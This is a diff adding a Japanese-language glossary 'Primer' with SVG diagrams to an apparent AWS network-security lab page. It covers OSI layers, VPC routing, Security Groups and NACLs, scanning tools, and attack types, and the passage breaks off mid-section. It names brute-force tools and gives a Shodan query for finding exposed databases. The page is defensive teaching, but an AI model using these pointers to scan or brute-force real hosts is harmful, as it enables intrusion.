@@ -633,6 +633,781 @@
               </figure>
             </div>
           </section>
+          <!-- ===== Primer — Prerequisites / Glossary ===== -->
+          <section id="section-primer" class="mt-16 scroll-mt-20" data-toc="Primer">
+            <header class="mb-6">
+              <p
+                class="text-sm font-semibold uppercase tracking-wider text-indigo-600 dark:text-indigo-400"
+              >
+                Primer / 前提知識
+              </p>
+              <h2
+                class="mt-1 text-2xl font-bold tracking-tight text-slate-900 dark:text-white sm:text-3xl"
+              >
+                Primer — このページを読むための前提知識
+              </h2>
+              <p
+                class="mt-2 max-w-prose text-sm leading-relaxed text-slate-600 dark:text-slate-400"
+              >
+                以下の用語に馴染みがない場合、 Network Layer Differences を読む前に目を通してください。クリックで各カテゴリを展開できます。
+              </p>
+            </header>
+
+            <!-- Shared SVG marker defs for primer diagrams (primer-prefixed to avoid collision) -->
+            <svg width="0" height="0" aria-hidden="true" focusable="false" class="absolute">
+              <defs>
+                <marker id="primer-arrow-red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#dc2626" />
+                </marker>
+                <marker id="primer-arrow-emerald" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#10b981" />
+                </marker>
+                <marker id="primer-arrow-amber" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#f59e0b" />
+                </marker>
+                <marker id="primer-arrow-indigo" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#6366f1" />
+                </marker>
+                <marker id="primer-arrow-slate" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#64748b" />
+                </marker>
+              </defs>
+            </svg>
+
+            <style>
+              /* Primer accordion styling — uses native <details>/<summary> for a11y */
+              .primer-cat {
+                border: 1px solid rgb(226 232 240);
+                border-radius: 0.75rem;
+                background-color: rgb(255 255 255);
+                overflow: hidden;
+              }
+              .dark .primer-cat {
+                border-color: rgb(51 65 85);
+                background-color: rgb(30 41 59 / 0.6);
+              }
+              .primer-cat + .primer-cat {
+                margin-top: 0.75rem;
+              }
+              .primer-cat > summary {
+                cursor: pointer;
+                list-style: none;
+                padding: 1rem 1.25rem;
+                display: flex;
+                align-items: center;
+                gap: 0.75rem;
+                font-weight: 600;
+                color: rgb(15 23 42);
+                user-select: none;
+                outline: none;
+              }
+              .dark .primer-cat > summary {
+                color: rgb(241 245 249);
+              }
+              .primer-cat > summary::-webkit-details-marker {
+                display: none;
+              }
+              .primer-cat > summary:hover {
+                background-color: rgb(248 250 252);
+              }
+              .dark .primer-cat > summary:hover {
+                background-color: rgb(30 41 59);
+              }
+              .primer-cat > summary:focus-visible {
+                box-shadow: inset 0 0 0 2px rgb(99 102 241);
+              }
+              .primer-cat > summary .primer-chev {
+                margin-left: auto;
+                transition: transform 0.2s ease;
+                color: rgb(100 116 139);
+              }
+              @media (prefers-reduced-motion: reduce) {
+                .primer-cat > summary .primer-chev {
+                  transition: none;
+                }
+              }
+              .primer-cat[open] > summary .primer-chev {
+                transform: rotate(90deg);
+              }
+              .primer-body {
+                padding: 0 1.25rem 1.25rem 1.25rem;
+                border-top: 1px solid rgb(241 245 249);
+              }
+              .dark .primer-body {
+                border-top-color: rgb(51 65 85);
+              }
+              .primer-overview {
+                font-size: 0.875rem;
+                line-height: 1.6;
+                color: rgb(71 85 105);
+                margin: 1rem 0;
+              }
+              .dark .primer-overview {
+                color: rgb(203 213 225);
+              }
+              .primer-card {
+                border: 1px solid rgb(226 232 240);
+                border-radius: 0.5rem;
+                padding: 1rem;
+                background-color: rgb(255 255 255);
+              }
+              .dark .primer-card {
+                border-color: rgb(51 65 85);
+                background-color: rgb(15 23 42 / 0.4);
+              }
+              .primer-term {
+                font-family: "JetBrains Mono", ui-monospace, monospace;
+                color: rgb(79 70 229);
+                font-weight: 600;
+                font-size: 0.875rem;
+                line-height: 1.4;
+                display: block;
+                margin-bottom: 0.5rem;
+              }
+              .dark .primer-term {
+                color: rgb(165 180 252);
+              }
+              .primer-def {
+                color: rgb(51 65 85);
+                font-size: 0.875rem;
+                line-height: 1.6;
+              }
+              .dark .primer-def {
+                color: rgb(226 232 240);
+              }
+              .primer-why {
+                font-size: 0.75rem;
+                line-height: 1.6;
+                color: rgb(100 116 139);
+                border-left: 2px solid #f59e0b;
+                padding-left: 0.75rem;
+                margin-top: 0.5rem;
+              }
+              .dark .primer-why {
+                color: rgb(148 163 184);
+              }
+              .primer-svg-wrap {
+                margin: 1rem 0 1.25rem 0;
+                padding: 0.75rem;
+                border: 1px dashed rgb(203 213 225);
+                border-radius: 0.5rem;
+                background-color: rgb(248 250 252);
+                overflow-x: auto;
+              }
+              .dark .primer-svg-wrap {
+                border-color: rgb(71 85 105);
+                background-color: rgb(15 23 42 / 0.4);
+              }
+            </style>
+
+            <!-- ===== Category 1: OSI モデルと「層」 ===== -->
+            <details class="primer-cat" open>
+              <summary>
+                <i data-lucide="layers" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>1. OSI モデルと「層」の概念</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">3 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  ネットワーク通信は複数の層 (Layer) で重なり合っている。攻撃と防御は「どの層」で起きるかで意味が変わる。本ラボで頻出するのは L3 / L4 / L7。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 220 340" class="block h-auto w-full max-w-[260px]" role="img" aria-labelledby="primer-osi-title primer-osi-desc">
+                    <title id="primer-osi-title">OSI 7 層モデル</title>
+                    <desc id="primer-osi-desc">
+                      OSI 7 層を縦に積層表示。本ラボに関係する L3 (IP)、L4 (TCP)、L7 (HTTP) を強調。
+                    </desc>
+                    <g font-family="Inter, sans-serif" font-size="11">
+                      <rect x="20" y="20"  width="180" height="36" rx="4" fill="#f1f5f9" stroke="#94a3b8" />
+                      <text x="30" y="42" font-weight="600" fill="#334155">L7 Application</text>
+                      <text x="195" y="42" text-anchor="end" font-size="9" fill="#6366f1" font-weight="700">HTTP/DNS</text>
+
+                      <rect x="20" y="60"  width="180" height="36" rx="4" fill="#f8fafc" stroke="#cbd5e1" />
+                      <text x="30" y="82" fill="#475569">L6 Presentation</text>
+
+                      <rect x="20" y="100" width="180" height="36" rx="4" fill="#f8fafc" stroke="#cbd5e1" />
+                      <text x="30" y="122" fill="#475569">L5 Session</text>
+
+                      <rect x="20" y="140" width="180" height="36" rx="4" fill="#f1f5f9" stroke="#94a3b8" />
+                      <text x="30" y="162" font-weight="600" fill="#334155">L4 Transport</text>
+                      <text x="195" y="162" text-anchor="end" font-size="9" fill="#6366f1" font-weight="700">TCP/UDP</text>
+
+                      <rect x="20" y="180" width="180" height="36" rx="4" fill="#f1f5f9" stroke="#94a3b8" />
+                      <text x="30" y="202" font-weight="600" fill="#334155">L3 Network</text>
+                      <text x="195" y="202" text-anchor="end" font-size="9" fill="#6366f1" font-weight="700">IP/ICMP</text>
+
+                      <rect x="20" y="220" width="180" height="36" rx="4" fill="#f8fafc" stroke="#cbd5e1" />
+                      <text x="30" y="242" fill="#475569">L2 Data Link</text>
+
+                      <rect x="20" y="260" width="180" height="36" rx="4" fill="#f8fafc" stroke="#cbd5e1" />
+                      <text x="30" y="282" fill="#475569">L1 Physical</text>
+
+                      <text x="110" y="320" text-anchor="middle" font-size="10" fill="#64748b">本ラボの主戦場 = L3 / L4 / L7</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">L3 (Network Layer)</span>
+                    <p class="primer-def">IP アドレスでホストを識別し、ルーティングする層。ICMP (ping) もここ。「L3 不可達」とは IP 的にパケットが相手に届かない状態 (例: Private Subnet には IGW 経由のルートがないため、外部 IP からのパケットが配送経路を持たない)。</p>
+                    <p class="primer-why">なぜ重要か: Private 配置の本質は「L3 でそもそも届かない」こと。SG/NACL より手前で防御が成立する。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">L4 (Transport Layer)</span>
+                    <p class="primer-def">TCP / UDP。ポート番号でアプリを識別 (22=SSH, 80=HTTP, 5432=PostgreSQL)。TCP は接続前に 3-way handshake (SYN → SYN-ACK → ACK) を行う。ポートスキャナはこの handshake の応答有無で「ポートが開いているか」を判定。</p>
+                    <p class="primer-why">なぜ重要か: ポートスキャンの結果 (open / closed / filtered) は L4 で決まる。SG ドロップは「filtered」を生成する。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">L7 (Application Layer)</span>
+                    <p class="primer-def">HTTP, HTTPS, DNS, SSH などのプロトコル本体。ヘッダや URL の中身が見える。ALB の routing や WAF のシグネチャマッチはここで動作。</p>
+                    <p class="primer-why">なぜ重要か: SQLi / XSS / SSRF など Web 攻撃は L7 でしか検出できない。WAF が L7 で機能する所以。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 2: AWS VPC ネットワーキング ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="network" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>2. AWS VPC ネットワーキングの基礎</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">7 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  AWS の VPC は IP 空間を独自に持つ仮想ネットワーク。「Public / Private」の区別はリソース自体ではなく、Route Table の中身で決まる。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 600 300" class="block h-auto w-full" role="img" aria-labelledby="primer-vpc-title primer-vpc-desc">
+                    <title id="primer-vpc-title">VPC と Subnet ・ Route Table の関係</title>
+                    <desc id="primer-vpc-desc">
+                      VPC 内に Public Subnet と Private Subnet を配置。 Public は IGW にデフォルトルートを持ち、 Private は NAT GW 経由 (outbound のみ)。
+                    </desc>
+                    <g font-family="Inter, sans-serif">
+                      <text x="20" y="30" font-size="11" fill="#7f1d1d" font-weight="700">Internet</text>
+                      <rect x="60" y="40" width="60" height="36" rx="6" fill="#fff" stroke="#64748b" stroke-width="1.5" />
+                      <text x="90" y="63" text-anchor="middle" font-size="11" font-weight="600" fill="#334155">IGW</text>
+
+                      <rect x="150" y="20" width="430" height="260" rx="10" fill="none" stroke="#94a3b8" stroke-width="1.5" stroke-dasharray="6 4" />
+                      <text x="165" y="40" font-size="11" font-weight="600" fill="#475569">VPC 10.0.0.0/16</text>
+
+                      <rect x="170" y="55" width="180" height="100" rx="8" fill="#fef2f2" stroke="#fca5a5" stroke-width="1.5" />
+                      <text x="180" y="75" font-size="11" font-weight="700" fill="#b91c1c">Public Subnet</text>
+                      <text x="180" y="92" font-size="10" fill="#991b1b">10.0.1.0/24</text>
+                      <rect x="200" y="105" width="120" height="38" rx="6" fill="#fff" stroke="#ef4444" stroke-width="2" />
+                      <text x="260" y="129" text-anchor="middle" font-size="11" font-weight="600" fill="#7f1d1d">EC2 (Public IP)</text>
+
+                      <rect x="380" y="55" width="180" height="100" rx="8" fill="#ecfdf5" stroke="#6ee7b7" stroke-width="1.5" />
+                      <text x="390" y="75" font-size="11" font-weight="700" fill="#065f46">Private Subnet</text>
+                      <text x="390" y="92" font-size="10" fill="#047857">10.0.11.0/24</text>
+                      <rect x="410" y="105" width="120" height="38" rx="6" fill="#fff" stroke="#10b981" stroke-width="2" />
+                      <text x="470" y="129" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">EC2 (no Public IP)</text>
+
+                      <rect x="265" y="180" width="100" height="36" rx="6" fill="#fff" stroke="#64748b" stroke-width="1.5" />
+                      <text x="315" y="203" text-anchor="middle" font-size="11" font-weight="600" fill="#334155">NAT GW</text>
+
+                      <line x1="120" y1="58" x2="260" y2="105" stroke="#dc2626" stroke-width="2.5" marker-end="url(#primer-arrow-red)" />
+                      <text x="190" y="78" font-size="10" fill="#7f1d1d" font-family="JetBrains Mono, monospace">inbound: yes</text>
+
+                      <line x1="315" y1="180" x2="115" y2="76" stroke="#10b981" stroke-width="2" stroke-dasharray="4 3" marker-end="url(#primer-arrow-emerald)" />
+                      <text x="200" y="170" font-size="10" fill="#065f46" font-family="JetBrains Mono, monospace">outbound only</text>
+
+                      <line x1="470" y1="143" x2="365" y2="195" stroke="#10b981" stroke-width="2" stroke-dasharray="4 3" marker-end="url(#primer-arrow-emerald)" />
+
+                      <rect x="170" y="230" width="180" height="40" rx="4" fill="#fff" stroke="#cbd5e1" />
+                      <text x="180" y="248" font-size="10" font-weight="600" fill="#334155">Public RT</text>
+                      <text x="180" y="262" font-size="9" font-family="JetBrains Mono, monospace" fill="#475569">0.0.0.0/0 → IGW</text>
+
+                      <rect x="380" y="230" width="180" height="40" rx="4" fill="#fff" stroke="#cbd5e1" />
+                      <text x="390" y="248" font-size="10" font-weight="600" fill="#334155">Private RT</text>
+                      <text x="390" y="262" font-size="9" font-family="JetBrains Mono, monospace" fill="#475569">0.0.0.0/0 → NAT GW</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">VPC</span>
+                    <p class="primer-def">AWS 上で作る独立した仮想ネットワーク。10.0.0.0/16 のような CIDR を持つ。</p>
+                    <p class="primer-why">なぜ重要か: Public/Private の議論はすべて 1 つの VPC 内のサブネット配置の話。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Subnet</span>
+                    <p class="primer-def">VPC を分割した小区画。「Public」「Private」はラベルではなく、Route Table が IGW へのルートを持つかどうかで実質決まる。</p>
+                    <p class="primer-why">なぜ重要か: 名前やタグを「Public」と付けても Route が IGW なしなら Private 扱い。逆も然り。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">IGW (Internet Gateway)</span>
+                    <p class="primer-def">VPC をインターネットと接続する論理デバイス。Subnet が IGW へのデフォルトルートを持ち、かつホストに Public IP が付与されると外部から到達可能になる。</p>
+                    <p class="primer-why">なぜ重要か: IGW + Public IP + Route の 3 点セットが揃わなければ「公開」にならない。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">NAT Gateway</span>
+                    <p class="primer-def">Private Subnet 内のホストが outbound のみインターネットに出るためのデバイス。送信元 IP を NAT GW の EIP に書き換える。inbound は通さない。destination の中身を見ないので egress フィルタにはならない。</p>
+                    <p class="primer-why">なぜ重要か: NAT GW は「出口の集約」であって「出口の検閲」ではない。C2 / exfil の検出には別の仕組みが要る。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Route Table</span>
+                    <p class="primer-def">Subnet ごとに紐づく経路表。「0.0.0.0/0 → IGW」を持つ Subnet は Public、「0.0.0.0/0 → NAT GW」 もしくはルートなしは Private。</p>
+                    <p class="primer-why">なぜ重要か: Public / Private の正体はここに書かれている。Terraform レビューの最重要ポイント。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">AZ (Availability Zone)</span>
+                    <p class="primer-def">リージョン内の独立データセンター群。ALB は最低 2 AZ をまたぐ Subnet を要求する。</p>
+                    <p class="primer-why">なぜ重要か: ALB を組むには「Private Subnet を 2 AZ 用意」が前提。設計初期に効いてくる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Public IP</span>
+                    <p class="primer-def">インスタンスに付与される外向き IP。これがないとインターネットからの到達対象になり得ない。</p>
+                    <p class="primer-why">なぜ重要か: Public IP の有無は「攻撃面が存在するか」を決める一次変数。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 3: ファイアウォール ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="shield" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>3. ファイアウォール — Security Group と NACL</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">5 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  AWS の主要な FW は Security Group (SG) と Network ACL (NACL) の 2 種類。本ラボでは SG が中心。 ALB の介在による「SG ミス吸収」効果はここで理解する。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 600 250" class="block h-auto w-full" role="img" aria-labelledby="primer-fw-title primer-fw-desc">
+                    <title id="primer-fw-title">SG (ステートフル) と NACL (ステートレス) の挙動差</title>
+                    <desc id="primer-fw-desc">
+                      左: SG はステートフルで戻りパケットを自動許可。右: NACL はステートレスで in/out を独立評価。
+                    </desc>
+                    <g font-family="Inter, sans-serif">
+                      <rect x="20" y="20" width="270" height="210" rx="10" fill="#eef2ff" stroke="#6366f1" stroke-width="1.5" />
+                      <text x="35" y="42" font-size="12" font-weight="700" fill="#3730a3">Security Group (Stateful)</text>
+                      <text x="35" y="60" font-size="10" fill="#4338ca">ENI 単位 / 戻り自動許可</text>
+
+                      <rect x="40" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#6366f1" />
+                      <text x="90" y="103" text-anchor="middle" font-size="11" font-weight="600" fill="#3730a3">Client</text>
+
+                      <rect x="180" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#6366f1" />
+                      <text x="230" y="103" text-anchor="middle" font-size="11" font-weight="600" fill="#3730a3">EC2</text>
+
+                      <line x1="140" y1="92" x2="180" y2="92" stroke="#10b981" stroke-width="2" marker-end="url(#primer-arrow-emerald)" />
+                      <text x="160" y="86" text-anchor="middle" font-size="9" fill="#065f46">in: allow</text>
+
+                      <line x1="180" y1="108" x2="140" y2="108" stroke="#10b981" stroke-width="2" stroke-dasharray="3 2" marker-end="url(#primer-arrow-emerald)" />
+                      <text x="160" y="125" text-anchor="middle" font-size="9" fill="#065f46">out: 自動許可</text>
+
+                      <text x="35" y="170" font-size="11" font-weight="600" fill="#3730a3">Referenced SG rule:</text>
+                      <text x="35" y="188" font-size="10" font-family="JetBrains Mono, monospace" fill="#4338ca">source = sg-alb (not CIDR)</text>
+                      <text x="35" y="206" font-size="10" fill="#4338ca">→ IP 変更に追従、誤許可リスク↓</text>
+
+                      <rect x="310" y="20" width="270" height="210" rx="10" fill="#fff7ed" stroke="#f59e0b" stroke-width="1.5" />
+                      <text x="325" y="42" font-size="12" font-weight="700" fill="#92400e">NACL (Stateless)</text>
+                      <text x="325" y="60" font-size="10" fill="#b45309">Subnet 単位 / 戻りも明示許可必要</text>
+
+                      <rect x="330" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#f59e0b" />
+                      <text x="380" y="103" text-anchor="middle" font-size="11" font-weight="600" fill="#92400e">Subnet</text>
+
+                      <rect x="470" y="80" width="100" height="36" rx="6" fill="#fff" stroke="#f59e0b" />
+                      <text x="520" y="103" text-anchor="middle" font-size="11" font-weight="600" fill="#92400e">EC2</text>
+
+                      <line x1="430" y1="92" x2="470" y2="92" stroke="#10b981" stroke-width="2" marker-end="url(#primer-arrow-emerald)" />
+                      <text x="450" y="86" text-anchor="middle" font-size="9" fill="#065f46">in: rule#100</text>
+
+                      <line x1="470" y1="108" x2="430" y2="108" stroke="#dc2626" stroke-width="2" marker-end="url(#primer-arrow-red)" />
+                      <text x="450" y="125" text-anchor="middle" font-size="9" fill="#7f1d1d">out: 別ルール必要</text>
+
+                      <text x="325" y="170" font-size="11" font-weight="600" fill="#92400e">用途:</text>
+                      <text x="325" y="188" font-size="10" fill="#b45309">Subnet 全体への broad deny</text>
+                      <text x="325" y="206" font-size="10" fill="#b45309">(SG の上位レイヤ補助)</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">Security Group (SG)</span>
+                    <p class="primer-def">ENI (≒インスタンス NIC) 単位で動作するステートフルファイアウォール。「ステートフル」とは inbound で許可した接続の戻りトラフィック (outbound) が自動的に通る性質。</p>
+                    <p class="primer-why">なぜ重要か: ほとんどの AWS FW 設定は SG。ここの誤りは即「全世界に開放」を意味する。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Stateful FW</span>
+                    <p class="primer-def">接続単位を追跡する FW。一度許可した接続の戻りパケットを自動許可する。SG はこれ。</p>
+                    <p class="primer-why">なぜ重要か: outbound の許可ルール作成を省略でき、設定ミスが減る。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Stateless FW</span>
+                    <p class="primer-def">各パケットを独立に評価する FW。戻りも明示的に許可する必要がある。NACL はこれ。</p>
+                    <p class="primer-why">なぜ重要か: NACL の rule 設計ミスは「片方向だけ通る」という奇妙な障害を生む。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Referenced SG Rule</span>
+                    <p class="primer-def">Source/Destination を「他の SG ID」として指定する書き方 (例: ALB SG を許可)。 IP/CIDR ではなく論理グループで繋がるため、IP 変更に追従し、SG ミス (<code class="font-mono text-xs">0.0.0.0/0</code> を誤許可) のリスクが下がる。</p>
+                    <p class="primer-why">なぜ重要か: Config B の安全性は「EC2 の SG が ALB SG のみを許可」で担保される。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">NACL (Network ACL)</span>
+                    <p class="primer-def">Subnet 単位で動作するステートレスフィルタ。SG の上位の "broad deny" 用途。</p>
+                    <p class="primer-why">なぜ重要か: 既知 IoC IP の Subnet 単位ブロックなど、SG では書きにくいルールを担う。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 4: 偵察 (Reconnaissance) ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="search" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>4. 偵察 (Reconnaissance) と公開資産の発見</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">5 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  攻撃の最初の段階は「対象を見つける」こと。 Public IP は インターネット全体の常時スキャンに晒されている ことを理解する。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 600 250" class="block h-auto w-full" role="img" aria-labelledby="primer-recon-title primer-recon-desc">
+                    <title id="primer-recon-title">TCP 3-way handshake とポートスキャナの判定</title>
+                    <desc id="primer-recon-desc">
+                      Config A の EC2 は SYN-ACK を返し open と判定される。Config B では SYN がそもそも届かず unanswered = filtered と判定される。
+                    </desc>
+                    <g font-family="Inter, sans-serif">
+                      <text x="20" y="25" font-size="12" font-weight="700" fill="#7f1d1d">Config A: EC2 が SYN-ACK 応答 → "open"</text>
+
+                      <rect x="20" y="40" width="80" height="34" rx="6" fill="#fff" stroke="#dc2626" />
+                      <text x="60" y="61" text-anchor="middle" font-size="11" font-weight="600" fill="#7f1d1d">Scanner</text>
+                      <rect x="220" y="40" width="80" height="34" rx="6" fill="#fff" stroke="#dc2626" />
+                      <text x="260" y="61" text-anchor="middle" font-size="11" font-weight="600" fill="#7f1d1d">EC2</text>
+
+                      <line x1="100" y1="50" x2="220" y2="50" stroke="#dc2626" stroke-width="1.8" marker-end="url(#primer-arrow-red)" />
+                      <text x="160" y="46" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="#7f1d1d">SYN</text>
+
+                      <line x1="220" y1="62" x2="100" y2="62" stroke="#10b981" stroke-width="1.8" marker-end="url(#primer-arrow-emerald)" />
+                      <text x="160" y="58" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="#065f46">SYN-ACK</text>
+
+                      <line x1="100" y1="74" x2="220" y2="74" stroke="#dc2626" stroke-width="1.8" marker-end="url(#primer-arrow-red)" />
+                      <text x="160" y="70" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="#7f1d1d">ACK</text>
+
+                      <text x="320" y="60" font-size="11" font-family="JetBrains Mono, monospace" font-weight="700" fill="#7f1d1d">→ port: open</text>
+
+                      <text x="20" y="135" font-size="12" font-weight="700" fill="#065f46">Config B: SYN がドロップ → "filtered"</text>
+
+                      <rect x="20" y="150" width="80" height="34" rx="6" fill="#fff" stroke="#10b981" />
+                      <text x="60" y="171" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">Scanner</text>
+                      <rect x="180" y="150" width="80" height="34" rx="6" fill="#f1f5f9" stroke="#94a3b8" stroke-dasharray="4 3" />
+                      <text x="220" y="171" text-anchor="middle" font-size="11" font-weight="600" fill="#475569">SG / Route</text>
+                      <rect x="320" y="150" width="80" height="34" rx="6" fill="#fff" stroke="#10b981" />
+                      <text x="360" y="171" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">EC2</text>
+
+                      <line x1="100" y1="167" x2="180" y2="167" stroke="#dc2626" stroke-width="1.8" marker-end="url(#primer-arrow-red)" />
+                      <text x="140" y="161" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="#7f1d1d">SYN</text>
+
+                      <line x1="260" y1="167" x2="320" y2="167" stroke="#94a3b8" stroke-width="1.8" stroke-dasharray="3 2" />
+                      <text x="290" y="161" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="#64748b">dropped</text>
+
+                      <text x="420" y="170" font-size="11" font-family="JetBrains Mono, monospace" font-weight="700" fill="#065f46">→ port: filtered</text>
+                      <text x="20" y="220" font-size="10" fill="#475569">Public IP のホストは masscan / ZMap の対象 = 数十分でインターネット全体がスキャンされる前提</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">Port Scanner</span>
+                    <p class="primer-def">対象ホストの開放ポートを列挙するツール (<code class="font-mono text-xs">nmap</code>, <code class="font-mono text-xs">masscan</code>, <code class="font-mono text-xs">ZMap</code>)。 TCP SYN を送り、 SYN-ACK が返れば「open」、 RST なら「closed」、 無応答なら「filtered (FW でドロップ)」と判定。</p>
+                    <p class="primer-why">なぜ重要か: 攻撃の起点。スキャンで見つけた open ポートが脆弱性試行のターゲットになる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">masscan / ZMap</span>
+                    <p class="primer-def">インターネット全体 (IPv4 約 40 億 IP) を数十分でスキャンできる超高速スキャナ。攻撃者は常時これで世界をスキャンしている。</p>
+                    <p class="primer-why">なぜ重要か: 「うちは小さいから狙われない」は通じない。 Public IP がある = 数時間以内に発見される前提で設計する。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Shodan</span>
+                    <p class="primer-def">インターネットを継続的にスキャンして公開資産を検索可能にしたサービス。「banner grabbing」も行うので OS や CMS のバージョンまで特定される。</p>
+                    <p class="primer-why">なぜ重要か: 攻撃者は <code class="font-mono text-xs">port:5432 country:JP</code> 等で標的を秒で絞り込める。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Censys</span>
+                    <p class="primer-def">Shodan と同種の検索サービス。 TLS 証明書の解析にも強い。</p>
+                    <p class="primer-why">なぜ重要か: 証明書の SAN から内部用ホスト名がリークし、想定外の偵察起点になる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">OSINT (Open Source Intelligence)</span>
+                    <p class="primer-def">公開情報からの偵察。 DNS, GitHub, SNS, 証明書透明性ログ (CT log) など。</p>
+                    <p class="primer-why">なぜ重要か: スキャンより手前に漏れる情報 (リポジトリの IaC, 履歴の secret 等) が多い。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 5: 攻撃の類型 ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="bug" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>5. 攻撃の類型 — 名前を付けて整理する</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">12 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  本ラボで言及される代表的攻撃類型を整理。「層」と「目的」を区別。
+                </p>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">Brute Force</span>
+                    <p class="primer-def">ID/PW を総当たりで試す攻撃。 SSH(22) や RDP(3389) に対して <code class="font-mono text-xs">hydra</code>, <code class="font-mono text-xs">medusa</code> などで実行される。</p>
+                    <p class="primer-why">なぜ重要か: 22 を世界に開けると「いずれ来る」ではなく「常時試行されている」状態になる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Credential Stuffing</span>
+                    <p class="primer-def">既にどこかでリークした ID/PW の組を別サービスで試す。パスワード使い回しを狙う。</p>
+                    <p class="primer-why">なぜ重要か: ログイン経路を持つ全サービスの脅威。MFA / レート制限が必須対策。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">DDoS</span>
+                    <p class="primer-def">多数の攻撃元からトラフィックを集中させてサービス停止を狙う。 L3/L4 (SYN flood, UDP flood) と L7 (HTTP flood) がある。</p>
